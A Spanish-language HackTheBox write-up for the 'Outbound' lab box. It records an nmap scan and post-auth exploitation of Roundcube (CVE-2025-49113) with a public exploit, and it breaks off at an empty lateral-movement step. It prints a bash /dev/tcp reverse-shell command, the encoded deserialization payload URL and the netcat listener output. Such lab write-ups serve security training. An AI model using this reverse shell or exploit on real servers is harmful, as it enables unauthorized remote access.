# HTB: Outbound

## Host: Linux
## IP: 10.10.11.77

## Procedimiento y comandos

* Se nos proveen las credenciales para esta maquina:

> As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2

user: **tyler**
password: ** LhKL1o9Nm3X2 **

#### Paso 1: Enumeracion

* Nmap

```bash
  cat Outbound-nmap.txt 
# Nmap 7.95 scan initiated Sun Sep  7 18:49:36 2025 as: /usr/lib/nmap/nmap -A -oN Outbound-nmap.txt 10.10.11.77
Nmap scan report for 10.10.11.77
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   164.84 ms 10.10.14.1
2   164.93 ms 10.10.11.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  7 18:49:54 2025 -- 1 IP address (1 host up) scanned in 18.78 seconds
```
#### Paso 2: Acceso inicial

* Buscamos un exploit para **Roundcube webmail**

[Exploit 1](https://github.com/00xCanelo/CVE-2025-49113) python
[Exploit 2](https://github.com/hakaioffsec/CVE-2025-49113-exploit) php
[Exploit 3](https://github.com/fearsoff-org/CVE-2025-49113) php

> Los dos primeros exploits no dieron resultados

1. Ejecutamos el exploit 3 con un receptor nc previamente activo

```bash
  php CVE-2025-49113.php http://mail.outbound.htb tyler 'LhKL1o9Nm3X2' "bash -c '/bin/sh -i >& /dev/tcp/10.10.14.188/4444 0>&1'"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
bash -c '/bin/sh -i >& /dev/tcp/10.10.14.188/4444 0>&1'

### Injecting payload...

### End payload: http://mail.outbound.htb/?_from=edit-%21%C2%22%C2%3B%C2i%C2%3A%C20%C2%3B%C2O%C2%3A%C21%C26%C2%3A%C2%22%C2C%C2r%C2y%C2p%C2t%C2_%C2G%C2P%C2G%C2_%C2E%C2n%C2g%C2i%C2n%C2e%C2%22%C2%3A%C21%C2%3A%C2%7B%C2S%C2%3A%C22%C26%C2%3A%C2%22%C2%5C%C20%C20%C2C%C2r%C2y%C2p%C2t%C2_%C2G%C2P%C2G%C2_%C2E%C2n%C2g%C2i%C2n%C2e%C2%5C%C20%C20%C2_%C2g%C2p%C2g%C2c%C2o%C2n%C2f%C2%22%C2%3B%C2S%C2%3A%C25%C27%C2%3A%C2%22%C2b%C2a%C2s%C2h%C2+%C2-%C2c%C2+%C2%27%C2%2F%C2b%C2i%C2n%C2%2F%C2s%C2h%C2+%C2-%C2i%C2+%C2%3E%C2%26%C2+%C2%2F%C2d%C2e%C2v%C2%2F%C2t%C2c%C2p%C2%2F%C21%C20%C2%5C%C22%C2e%C21%C20%C2%5C%C22%C2e%C21%C24%C2%5C%C22%C2e%C21%C28%C28%C2%2F%C24%C24%C24%C24%C2+%C20%C2%3E%C2%26%C21%C2%27%C2%3B%C2%23%C2%22%C2%3B%C2%7D%C2i%C2%3A%C20%C2%3B%C2b%C2%3A%C20%C2%3B%C2%7D%C2%22%C2%3B%C2%7D%C2%7D%C2&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

```

2. Receptor

```bash
  nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.77] 53106
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

#### Paso 3: Movimiento lateral/Escalada privilegios

1. Recoleccion de usuarios

```bash

```
